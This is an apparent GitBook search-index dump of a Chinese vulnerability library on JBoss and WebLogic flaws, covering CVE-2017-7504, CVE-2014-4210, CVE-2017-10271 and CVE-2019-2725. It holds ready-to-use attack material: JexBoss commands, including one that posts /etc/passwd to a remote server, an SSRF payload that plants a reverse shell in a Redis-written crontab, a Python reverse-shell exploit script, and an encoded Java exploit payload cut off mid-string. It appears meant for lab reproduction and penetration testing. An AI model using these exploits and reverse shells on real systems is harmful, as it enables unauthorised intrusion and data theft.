{"./":{"url":"./","title":"Introduction","keywords":"","body":"稻草人安全团队 漏洞文库 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:26:47 "},"book/Web服务器漏洞/":{"url":"book/Web服务器漏洞/","title":"Web服务器漏洞","keywords":"","body":"Web服务器漏洞🦔 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web服务器漏洞/Jboss/":{"url":"book/Web服务器漏洞/Jboss/","title":"Jboss","keywords":"","body":"Jboss 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web服务器漏洞/Jboss/Scan/":{"url":"book/Web服务器漏洞/Jboss/Scan/","title":"扫描工具","keywords":"","body":"扫描工具 Jexboss 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web服务器漏洞/Jboss/Scan/扫描工具 Jexboss.html":{"url":"book/Web服务器漏洞/Jboss/Scan/扫描工具 Jexboss.html","title":"扫描工具 Jexboss","keywords":"","body":"JexBoss - JBoss (and others Java Deserialization Vulnerabilities) verify and EXploitation Tool JexBoss is a tool for testing and exploiting vulnerabilities in JBoss Application Server and others Java Platforms, Frameworks, Applications, etc. Requirements Python >= 2.7.x urllib3 ipaddress Installation on Linux\\Mac To install the latest version of JexBoss, please use the following commands: git clone https://github.com/joaomatosf/jexboss.git cd jexboss pip install -r requires.txt python jexboss.py -h python jexboss.py -host http://target_host:8080 OR: Download the latest version at: https://github.com/joaomatosf/jexboss/archive/master.zip unzip master.zip cd jexboss-master pip install -r requires.txt python jexboss.py -h python jexboss.py -host http://target_host:8080 If you are using CentOS with Python 2.6, please install Python2.7. Installation example of the Python 2.7 on CentOS using Collections Software scl: yum -y install centos-release-scl yum -y install python27 scl enable python27 bash Installation on Windows If you are using Windows, you can use the Git Bash to run the JexBoss. Follow the steps below: Download and install Python Download and install Git for Windows After installing, run the Git for Windows and type the following commands: PATH=$PATH:C:\\Python27\\ PATH=$PATH:C:\\Python27\\Scripts git clone https://github.com/joaomatosf/jexboss.git cd jexboss pip install -r requires.txt python jexboss.py -h python jexboss.py -host http://target_host:8080 Features The tool and exploits were developed and tested for: JBoss Application Server versions: 3, 4, 5 and 6. Java Deserialization Vulnerabilities in multiple java frameworks, platforms and applications (e.g., Java Server Faces - JSF, Seam Framework, RMI over HTTP, Jenkins CLI RCE (CVE-2015-5317), Remote JMX (CVE-2016-3427, CVE-2016-8735), etc) The exploitation vectors are: /admin-console tested and working in JBoss versions 5 and 6 /jmx-console tested and working in JBoss versions 4, 5 and 6 /web-console/Invoker tested and working in JBoss versions 4, 5 and 6 /invoker/JMXInvokerServlet tested and working in JBoss versions 4, 5 and 6 Application Deserialization tested and working against multiple java applications, platforms, etc, via HTTP POST Parameters Servlet Deserialization tested and working against multiple java applications, platforms, etc, via servlets that process serialized objets (e.g. when you see an \"Invoker\" in a link) Apache Struts2 CVE-2017-5638 tested in Apache Struts 2 applications Others Videos Exploiting Java Deserialization Vulnerabilities (RCE) on JSF/Seam Applications via javax.faces.ViewState with JexBoss Exploiting JBoss Application Server with JexBoss Exploiting Apache Struts2 (RCE) with Jexboss (CVE-2017-5638) Screenshots Simple usage examples: $ python jexboss.py Example of standalone mode against JBoss: $ python jexboss.py -u http://192.168.0.26:8080 Usage modes: $ python jexboss.py -h Network scan mode: $ python jexboss.py -mode auto-scan -network 192.168.0.0/24 -ports 8080 -results results.txt Network scan with auto-exploit mode: $ python jexboss.py -mode auto-scan -A -network 192.168.0.0/24 -ports 8080 -results results.txt Results and recommendations: Reverse Shell (meterpreter integration) After you exploit a JBoss server, you can use the own jexboss command shell or perform a reverse connection using the following command: jexremote=YOUR_IP:YOUR_PORT Example: Shell>jexremote=192.168.0.10:4444 Example: When exploiting java deserialization vulnerabilities (Application Deserialization, Servlet Deserialization), the default options are: make a reverse shell connection or send a commando to execute. Usage examples For Java Deserialization Vulnerabilities in a custom HTTP parameter and to send a custom command to be executed on the exploited server: $ python jexboss.py -u http://vulnerable_java_app/page.jsf --app-unserialize -H parameter_name --cmd 'curl -d@/etc/passwd http://your_server' For Java Deserialization Vulnerabilities in a custom HTTP parameter and to make a reverse shell (this will ask for an IP address and port of your remote host): $ python jexboss.py -u http://vulnerable_java_app/page.jsf --app-unserialize -H parameter_name For Java Deserialization Vulnerabilities in a Servlet (like Invoker): $ python jexboss.py -u http://vulnerable_java_app/path --servlet-unserialize For Apache Struts 2 (CVE-2017-5638) $ python jexboss.py -u http://vulnerable_java_struts2_app/page.action --struts2 For Apache Struts 2 (CVE-2017-5638) with cookies for authenticated resources $ python jexboss.py -u http://vulnerable_java_struts2_app/page.action --struts2 --cookies \"JSESSIONID=24517D9075136F202DCE20E9C89D424D\" Auto scan mode: $ python jexboss.py -mode auto-scan -network 192.168.0.0/24 -ports 8080,80 -results report_auto_scan.log File scan mode: $ python jexboss.py -mode file-scan -file host_list.txt -out report_file_scan.log More Options: optional arguments: -h, --help show this help message and exit --version show program's version number and exit --auto-exploit, -A Send exploit code automatically (USE ONLY IF YOU HAVE PERMISSION!!!) --disable-check-updates, -D Disable two updates checks: 1) Check for updates performed by the webshell in exploited server at http://webshell.jexboss.net/jsp_version.txt and 2) check for updates performed by the jexboss client at http://joaomatosf.com/rnp/releases.txt -mode {standalone,auto-scan,file-scan} Operation mode (DEFAULT: standalone) --app-unserialize, -j Check for java unserialization vulnerabilities in HTTP parameters (eg. javax.faces.ViewState, oldFormData, etc) --servlet-unserialize, -l Check for java unserialization vulnerabilities in Servlets (like Invoker interfaces) --jboss Check only for JBOSS vectors. --jenkins Check only for Jenkins CLI vector. --jmxtomcat Check JMX JmxRemoteLifecycleListener in Tomcat (CVE-2016-8735 and CVE-2016-8735). OBS: Will not be checked by default. --proxy PROXY, -P PROXY Use a http proxy to connect to the target URL (eg. -P http://192.168.0.1:3128) --proxy-cred LOGIN:PASS, -L LOGIN:PASS Proxy authentication credentials (eg -L name:password) --jboss-login LOGIN:PASS, -J LOGIN:PASS JBoss login and password for exploit admin-console in JBoss 5 and JBoss 6 (default: admin:admin) --timeout TIMEOUT Seconds to wait before timeout connection (default 3) Standalone mode: -host HOST, -u HOST Host address to be checked (eg. -u http://192.168.0.10:8080) Advanced Options (USE WHEN EXPLOITING JAVA UNSERIALIZE IN APP LAYER): --reverse-host RHOST:RPORT, -r RHOST:RPORT Remote host address and port for reverse shell when exploiting Java Deserialization Vulnerabilities in application layer (for now, working only against *nix systems)(eg. 192.168.0.10:1331) --cmd CMD, -x CMD Send specific command to run on target (eg. curl -d @/etc/passwd http://your_server) --windows, -w Specifies that the commands are for rWINDOWS System$ (cmd.exe) --post-parameter PARAMETER, -H PARAMETER Specify the parameter to find and inject serialized objects into it. (egs. -H javax.faces.ViewState or -H oldFormData (Questions, problems, suggestions and etc: joaomatosf@gmail.com 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web服务器漏洞/Jboss/JBoss 4.x JBossMQ JMS 反序列化漏洞 CVE-2017-7504.html":{"url":"book/Web服务器漏洞/Jboss/JBoss 4.x JBossMQ JMS 反序列化漏洞 CVE-2017-7504.html","title":"JBoss 4.x JBossMQ JMS 反序列化漏洞 CVE-2017-7504","keywords":"","body":"JBoss 4.x JBossMQ JMS 反序列化漏洞 CVE-2017-7504 漏洞描述 Red Hat JBoss Application Server 是一款基于JavaEE的开源应用服务器。JBoss AS 4.x及之前版本中，JbossMQ实现过程的JMS over HTTP Invocation Layer的HTTPServerILServlet.java文件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利用该漏洞执行任意代码。 影响版本 [!NOTE] JBoss AS 4.x及之前版本 环境搭建 https://github.com/vulhub/vulhub.git cd vulhub/jboss/CVE-2017-7504 docker-compose build docker-compose up -d 漏洞复现 访问控制台 使用工具 Jexboss 进行漏洞扫描 python3 jexboss.py -host http://192.168.51.133:8080 成功利用漏洞执行命令 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web服务器漏洞/Weblogic/":{"url":"book/Web服务器漏洞/Weblogic/","title":"Weblogic","keywords":"","body":"Weblogic Weblogic SSRF漏洞 CVE-2014-4210 Weblogic XMLDecoder 远程代码执行漏洞 CVE-2017-10271 Weblogic 反序列化远程代码执行漏洞 CVE-2019-2725 Weblogic LDAP 远程代码执行漏洞 CVE-2021-2109 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web服务器漏洞/Weblogic/Scan/":{"url":"book/Web服务器漏洞/Weblogic/Scan/","title":"扫描工具","keywords":"","body":"扫描工具 WeblogicScanner 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web服务器漏洞/Weblogic/Scan/扫描工具 WeblogicScanner.html":{"url":"book/Web服务器漏洞/Weblogic/Scan/扫描工具 WeblogicScanner.html","title":"扫描工具 WeblogicScanner","keywords":"","body":"WeblogicScanner 漏洞扫描 源工具链接：https://github.com/rabbitmask/WeblogicScan weblogicScaner 简体中文 | English 截至 2020 年 11 月 27 日，weblogic 漏洞扫描工具。若存在未记录且已公开 POC 的漏洞，欢迎提交 issue。 原作者已经收集得比较完整了，在这里做了部分的 bug 修复，部分脚本 POC 未生效，配置错误等问题。之前查了一下发现部分 POC 无法使用。在这个项目里面对脚本做了一些修改，提高准确率。 注意：部分漏洞由于稳定性原因需要多次测试才可验证 目前可检测漏洞编号有（部分非原理检测，需手动验证）： weblogic administrator console CVE-2014-4210 CVE-2016-0638 CVE-2016-3510 CVE-2017-3248 CVE-2017-3506 CVE-2017-10271 CVE-2018-2628 CVE-2018-2893 CVE-2018-2894 CVE-2018-3191 CVE-2018-3245 CVE-2018-3252 CVE-2019-2618 CVE-2019-2725 CVE-2019-2729 CVE-2019-2890 CVE-2020-2551 CVE-2020-14882 CVE-2020-14883 快速开始 依赖 python >= 3.6 进入项目目录，使用以下命令安装依赖库 $ pip3 install requests 使用说明 usage: ws.py [-h] -t TARGETS [TARGETS ...] -v VULNERABILITY [VULNERABILITY ...] [-o OUTPUT] optional arguments: -h, --help 帮助信息 -t TARGETS [TARGETS ...], --targets TARGETS [TARGETS ...] 直接填入目标或文件列表（默认使用端口7001）. 例子： 127.0.0.1:7001 -v VULNERABILITY [VULNERABILITY ...], --vulnerability VULNERABILITY [VULNERABILITY ...] 漏洞名称或CVE编号，例子：\"weblogic administrator console\" -o OUTPUT, --output OUTPUT 输出 json 结果的路径。默认不输出结果 -s, --ssl 强制使用 https 协议请求 结果样例 (venv) ~/weblogicScanner$ python ws.py -t 192.168.124.129 [23:03:04][INFO] [*][Weblogic Console][192.168.56.129:7001] Start... [23:03:04][INFO] [+][Weblogic Console][192.168.56.129:7001] Found module! [23:03:04][INFO] [*][Weblogic Console][192.168.56.129:7001] Please verify manually! [23:03:04][INFO] [*][CVE-2014-4210][192.168.56.129:7001] Start... [23:03:04][INFO] [-][CVE-2014-4210][192.168.56.129:7001] Not found. [23:03:04][INFO] [*][CVE-2016-0638][192.168.56.129:7001] Start... [23:03:06][INFO] [-][CVE-2016-0638][192.168.56.129:7001] Not vulnerability. [23:03:06][INFO] [*][CVE-2016-3510][192.168.56.129:7001] Start... [23:03:08][INFO] [-][CVE-2016-3510][192.168.56.129:7001] Not vulnerability. [23:03:08][INFO] [*][CVE-2017-3248][192.168.56.129:7001] Start... [23:03:10][INFO] [-][CVE-2017-3248][192.168.56.129:7001] Not vulnerability. [23:03:10][INFO] [*][CVE-2017-3506][192.168.56.129:7001] Start... [23:03:10][INFO] [-][CVE-2017-3506][192.168.56.129:7001] Not vulnerability. [23:03:10][INFO] [*][CVE-2017-10271][192.168.56.129:7001] Start... [23:03:10][INFO] [-][CVE-2017-10271][192.168.56.129:7001] Not vulnerability. [23:03:10][INFO] [*][CVE-2018-2628][192.168.56.129:7001] Start... [23:03:14][INFO] [+][CVE-2018-2628][192.168.56.129:7001] Exists vulnerability! [23:03:14][INFO] [*][CVE-2018-2893][192.168.56.129:7001] Start... [23:03:18][INFO] [+][CVE-2018-2893][192.168.56.129:7001] Exists vulnerability! [23:03:18][INFO] [*][CVE-2018-2894][192.168.56.129:7001] Start... [23:03:19][INFO] [+][CVE-2018-2894][192.168.56.129:7001] Found module! [23:03:19][INFO] [*][CVE-2018-2894][192.168.56.129:7001] Please verify manually! [23:03:19][INFO] [*][CVE-2018-3191][192.168.56.129:7001] Start... [23:03:23][INFO] [+][CVE-2018-3191][192.168.56.129:7001] Exists vulnerability! [23:03:23][INFO] [*][CVE-2018-3245][192.168.56.129:7001] Start... [23:03:29][INFO] [-][CVE-2018-3245][192.168.56.129:7001] Not vulnerability. [23:03:29][INFO] [*][CVE-2018-3252][192.168.56.129:7001] Start... [23:03:36][INFO] [+][CVE-2018-3252][192.168.56.129:7001] Found module! [23:03:36][INFO] [*][CVE-2018-3252][192.168.56.129:7001] Please verify manually! [23:03:36][INFO] [*][CVE-2019-2618][192.168.56.129:7001] Start... [23:03:36][INFO] [+][CVE-2019-2618][192.168.56.129:7001] Found module! [23:03:36][INFO] [*][CVE-2019-2618][192.168.56.129:7001] Please verify manually! [23:03:36][INFO] [*][CVE-2019-2725][192.168.56.129:7001] Start... [23:03:46][INFO] [-][CVE-2019-2725][192.168.56.129:7001] Not vulnerability. [23:03:46][INFO] [*][CVE-2019-2729][192.168.56.129:7001] Start... [23:03:54][INFO] [-][CVE-2019-2729][192.168.56.129:7001] Not vulnerability. [23:03:54][INFO] [*][CVE-2019-2888][192.168.56.129:7001] Start... [23:03:56][INFO] [+][CVE-2019-2888][192.168.56.129:7001] Found module! [23:03:56][INFO] [*][CVE-2019-2888][192.168.56.129:7001] Please verify manually! [23:03:56][INFO] [*][CVE-2019-2890][192.168.56.129:7001] Start... [23:03:58][INFO] [-][CVE-2019-2890][192.168.56.129:7001] Not vulnerability. [23:03:58][INFO] [*][CVE-2020-2551][192.168.56.129:7001] Start... [23:03:58][INFO] [+][CVE-2020-2551][192.168.56.129:7001] Found module! [23:03:58][INFO] [*][CVE-2020-2551][192.168.56.129:7001] Please verify manually! [23:03:58][INFO] [*][CVE-2020-2555][192.168.56.129:7001] Start... [23:04:02][INFO] [+][CVE-2020-2555][192.168.56.129:7001] Exists vulnerability! [23:04:02][INFO] [*][CVE-2020-2883][192.168.56.129:7001] Start... [23:04:06][INFO] [+][CVE-2020-2883][192.168.56.129:7001] Exists vulnerability! [23:04:06][INFO] [*][CVE-2020-14882][192.168.56.129:7001] Start... [23:04:23][INFO] [-][CVE-2020-14882][192.168.56.129:7001] Not vulnerability. [23:04:23][INFO] [*][CVE-2020-14883][192.168.56.129:7001] Start... [23:04:23][INFO] [+][CVE-2020-14883][192.168.56.129:7001] Exists vulnerability! 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web服务器漏洞/Weblogic/Weblogic SSRF漏洞 CVE-2014-4210.html":{"url":"book/Web服务器漏洞/Weblogic/Weblogic SSRF漏洞 CVE-2014-4210.html","title":"Weblogic SSRF漏洞 CVE-2014-4210","keywords":"","body":"Weblogic SSRF漏洞 CVE-2014-4210 漏洞描述 Weblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件，此漏洞可通过HTTP协议利用，未经身份验证的远程攻击者可利用此漏洞影响受影响组件的机密性 漏洞影响 [!NOTE] Oracle WebLogic Server 10.0.2.0 Oracle WebLogic Server 10.3.6.0 环境搭建 git clone https://github.com/vulhub/vulhub.git cd vulhub/weblogic/ssrd docker-compose up -d 访问 http://xxx.xxx.xxx.xxx:7001 正常即可 漏洞复现 出现漏洞的 URL为 : http://xxx.xxx.xxx.xxx:7001/uddiexplorer/SearchPublicRegistries.jsp 使用 payload 进行探测, 将探测的位置写在 operator参数中 [!NOTE] 注意需要知道内网 IP http://xxx.xxx.xxx.xxx:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://xxx.xxx.xxx.xxx:7001 通过查看报错内容来进行判断 存在的报错内容如图，关键字为 404, 例如把 operator 参数改成 http://xxx.xxx.xxx.xxx:7000 这样不存在的则报错内容如下图 通过这样的方法就可以探测内网的开放端口情况，例如内网中有一台主机 IP：172.19.0.2 开启了 6379端口的redis服务 如果访问的非http协议，则会返回did not have a valid SOAP content-type，这样通过错误的不同，即可探测内网状态。 Weblogic的SSRF有一个比较大的特点，其虽然是一个“GET”请求，但是我们可以通过传入%0a%0d来注入换行符，而某些服务（如redis）是通过换行符来分隔每条命令，也就说我们可以通过该SSRF攻击内网中的redis服务器。 发送三条redis命令，将弹shell脚本写入/etc/crontab 中： set 1 \"\\n\\n\\n\\n* * * * * root bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/9999 0>&1\\n\\n\\n\\n\" config set dir /etc/ config set dbfilename crontab save 接着再将请求进行 url编码, [!NOTE] 注意，换行符是“\\r\\n”，也就是“%0D%0A” test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fxxx.xxx.xxx.xxx%2F9999%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa 发送payload http://xxx.xxx.xxx.xxx:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://172.19.0.2:6379/test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.19.0.3%2F9999%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa 发送后监听 172.19.0.3 9999端口 等待反弹shell [!NOTE] 最后补充一下，可进行利用的cron有如下几个地方： /etc/crontab 这个是肯定的 /etc/cron.d/* 将任意文件写到该目录下，效果和crontab相同，格式也要和/etc/crontab相同。漏洞利用这个目录，可以做到不覆盖任何其他文件的情况进行弹shell。 /var/spool/cron/root centos系统下root用户的cron文件 /var/spool/cron/crontabs/root debian系统下root用户的cron文件 漏洞利用POC GitHub脚本 CVE-2014-4210+Redis未授权访问 存活扫描: python SSRFX.py --url http://example.com/uddiexplorer/SearchPublicRegistries.jsp --app weblogic --network 172.16.5.0/24 --type livedetect 端口扫描: python SSRFX.py --url http://example.com/uddiexplorer/SearchPublicRegistries.jsp --app weblogic --network 172.16.5.0/24 --type portscan Goby && POC [!NOTE] Weblogic SSRF漏洞 CVE-2014-4210 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web服务器漏洞/Weblogic/Weblogic XMLDecoder 远程代码执行漏洞 CVE-2017-10271.html":{"url":"book/Web服务器漏洞/Weblogic/Weblogic XMLDecoder 远程代码执行漏洞 CVE-2017-10271.html","title":"Weblogic XMLDecoder 远程代码执行漏洞 CVE-2017-10271","keywords":"","body":"Weblogic XMLDecoder 远程代码执行漏洞 CVE-2017-10271 漏洞描述 Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。 影响版本 [!NOTE] Weblogic 10.3.6.0.0 Weblogic 12.1.3.0.0 Weblogic 12.2.1.0.0 Weblogic 12.2.1.2.0 环境搭建 git clone https://github.com/vulhub/vulhub.git cd vulhub/weblogic/CVE-2017-10271 docker-compose up -d 访问 http://xxx.xxx.xxx.xxx:7001 正常即可 漏洞复现 对 http://xxx.xxx.xxx.xxx:7001/wls-wsat/CoordinatorPortType 进行访问，存在这个url则可能存在漏洞 其他可利用URL /wls-wsat/CoordinatorPortType /wls-wsat/RegistrationPortTypeRPC /wls-wsat/ParticipantPortType /wls-wsat/RegistrationRequesterPortType /wls-wsat/CoordinatorPortType11 /wls-wsat/RegistrationPortTypeRPC11 /wls-wsat/ParticipantPortType11 /wls-wsat/RegistrationRequesterPortType11 使用POST方法上传以下数据反弹一个shell /bin/bash -c bash -i &gt;&amp; /dev/tcp/10.0.0.1/21 0&gt;&amp;1 使用Curl反弹shell (将上面的xml数据保存为poc.xml) curl -v -X POST -H \"Content-Type: text/xml\" --data @poc.xml \"http://xxx.xxx.xxx.xxx:7001/wls-wsat/CoordinatorPortType\" 也可以通过漏洞写入webshell文件 servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp ]]> 访问 http://xxx.xxx.xxx.xxx:7001/bea_wls_internal/test.jsp 即可得到写入的文件 漏洞利用POC 利用 weblogic-scan快速检测 [!NOTE] 反弹shell exp #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import sys import json def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: Weblogic 10.3.6.0.0 \\033[0m') print('+ \\033[34m Weblogic 12.1.3.0.0 \\033[0m') print('+ \\033[34m Weblogic 12.2.1.0.0 \\033[0m') print('+ \\033[34m Weblogic 12.2.1.2.0 \\033[0m') print('+ \\033[36m使用格式: python3 CVE-2017-10271.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx:7001 \\033[0m') print('+ \\033[36mCmd >>> shell(反弹shell) \\033[0m') print('+------------------------------------------') def POC_1(target_url, IP, PORT): vuln_url = target_url + \"/wls-wsat/CoordinatorPortType\" headers = { \"Content-Type\": \"text/xml\", \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } data = \"\"\" /bin/bash -c bash -i &gt;&amp; /dev/tcp/%s/%s 0&gt;&amp;1 \"\"\" % (IP,PORT) try: response = requests.request(\"POST\", url=vuln_url, headers=headers, data=data) except: print(\"\\033[31m[x] 漏洞利用失败 \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) IP = str(input(\"\\033[35m请输入监听IP >>> \\033[0m\")) PORT = str(input(\"\\033[35m请输入监听PORT >>> \\033[0m\")) POC_1(target_url, IP, PORT) 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web服务器漏洞/Weblogic/Weblogic 反序列化远程代码执行漏洞 CVE-2019-2725.html":{"url":"book/Web服务器漏洞/Weblogic/Weblogic 反序列化远程代码执行漏洞 CVE-2019-2725.html","title":"Weblogic 反序列化远程代码执行漏洞 CVE-2019-2725","keywords":"","body":"Weblogic 反序列化远程代码执行漏洞 CVE-2019-2725 漏洞描述 2019年06月15日，360CERT监测到在野的Oracle Weblogic远程反序列化命令执行漏洞，该漏洞绕过了最新的Weblogic补丁（CVE-2019-2725），攻击者可以发送精心构造的恶意HTTP请求，在未授权的情况下远程执行命令。目前官方补丁未发布，漏洞细节未公开。360CERT经研判后判定该漏洞综合评级为“高危”，强烈建议受影响的用户尽快根据临时修补建议进行临时处置，防止收到攻击者攻击。 漏洞影响 [!NOTE] Weblogic 10.3.6 Weblogic 12.1.3 环境搭建 git clone https://github.com/vulhub/vulhub.git cd vulhub/weblogic/CVE-2017-10271 docker-compose up -d 访问 http://xxx.xxx.xxx.xxx:7001 正常即可 漏洞复现 漏洞分析文章 https://xz.aliyun.com/t/5024 这里使用POC进行复现 POC地址: https://github.com/TopScrew/CVE-2019-2725 [!NOTE] POC可利用于命令执行和Webshell上传 漏洞利用POC https://github.com/TopScrew/CVE-2019-2725/blob/master/weblogic-2019-2725.py # encoding=utf8 import sys import requests from logzero import logger headers = { \"Accept-Language\":\"zh-CN,zh;q=0.9,en;q=0.8\", \"User-Agent\":\"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50\", \"Content-Type\":\"text/xml\", } def weblogic_10_3_6(ip,cmd): headers = { \"Accept-Language\":\"zh-CN,zh;q=0.9,en;q=0.8\", \"User-Agent\":\"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50\", \"Content-Type\":\"text/xml\", \"cmd\":\"%s\"%(cmd) } body = \"\"\" oracle.toplink.internal.sessions.UnitOfWorkChangeSeturl=\"%s/wls-wsat/CoordinatorPortType\"%(ip) rsp = requests.post(url, data=body, verify=False, headers=headers) logger.info(\"\\r\\n\"+rsp.text) def weblogic_12_1_3(ip,cmd): headers = { \"Accept-Language\":\"zh-CN,zh;q=0.9,en;q=0.8\", \"User-Agent\":\"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50\", \"Content-Type\":\"text/xml\" } body=''' xxxx org.slf4j.ext.EventData yv66vgAAADIAYwoAFAA8CgA9AD4KAD0APwoAQABBBwBCCgAFAEMHAEQKAAcARQgARgoABwBHBwBICgALADwKAAsASQoACwBKCABLCgATAEwHAE0IAE4HAE8HAFABAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAEExSZXN1bHRCYXNlRXhlYzsBAAhleGVjX2NtZAEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQADY21kAQASTGphdmEvbGFuZy9TdHJpbmc7AQABcAEAE0xqYXZhL2xhbmcvUHJvY2VzczsBAANmaXMBABVMamF2YS9pby9JbnB1dFN0cmVhbTsBAANpc3IBABtMamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcjsBAAJicgEAGExqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEABGxpbmUBAAZyZXN1bHQBAA1TdGFja01hcFRhYmxlBwBRBwBSBwBTBwBCBwBEAQAKRXhjZXB0aW9ucwEAB2RvX2V4ZWMBAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247BwBNBwBUAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAClNvdXJjZUZpbGUBAChSZXN1bHRCYXNlRXhlYy5qYXZhIGZyb20gSW5wdXRGaWxlT2JqZWN0DAAVABYHAFUMAFYAVwwAWABZBwBSDABaAFsBABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyDAAVAFwBABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyDAAVAF0BAAAMAF4AXwEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyDABgAGEMAGIAXwEAC2NtZC5leGUgL2MgDAAcAB0BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQALL2Jpbi9zaCAtYyABAA5SZXN1bHRCYXNlRXhlYwEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3RyaW5nAQARamF2YS9sYW5nL1Byb2Nlc3MBABNqYXZhL2lvL0lucHV0U3RyZWFtAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQATKExqYXZhL2lvL1JlYWRlcjspVgEACHJlYWRMaW5lAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwAhABMAFAAAAAAABAABABUAFgABABcAAAAvAAEAAQAAAAUqtwABsQAAAAIAGAAAAAYAAQAAAAMAGQAAAAwAAQAAAAUAGgAbAAAACQAcAB0AAgAXAAAA+QADAAcAAABOuAACKrYAA0wrtgAETbsABVkstwAGTrsAB1kttwAIOgQBOgUSCToGGQS2AApZOgXGABy7AAtZtwAMGQa2AA0ZBbYADbYADjoGp//fGQawAAAAAwAYAAAAJgAJAAAABgAIAAcADQAIABYACQAgAAoAIwALACcADAAyAA4ASwARABkAAABIAAcAAABOAB4AHwAAAAgARgAgACEAAQANAEEAIgAjAAIAFgA4ACQAJQADACAALgAmACcABAAjACsAKAAfAAUAJwAnACkAHwAGACoAAAAfAAL/ACcABwcAKwcALAcALQcALgcALwcAKwcAKwAAIwAwAAAABAABABEACQAxAB0AAgAXAAAAqgACAAMAAAA3EglMuwALWbcADBIPtgANKrYADbYADrgAEEynABtNuwALWbcADBIStgANKrYADbYADrgAEEwrsAABAAMAGgAdABEAAwAYAAAAGgAGAAAAFgADABkAGgAeAB0AGwAeAB0ANQAfABkAAAAgAAMAHgAXADIAMwACAAAANwAeAB8AAAADAD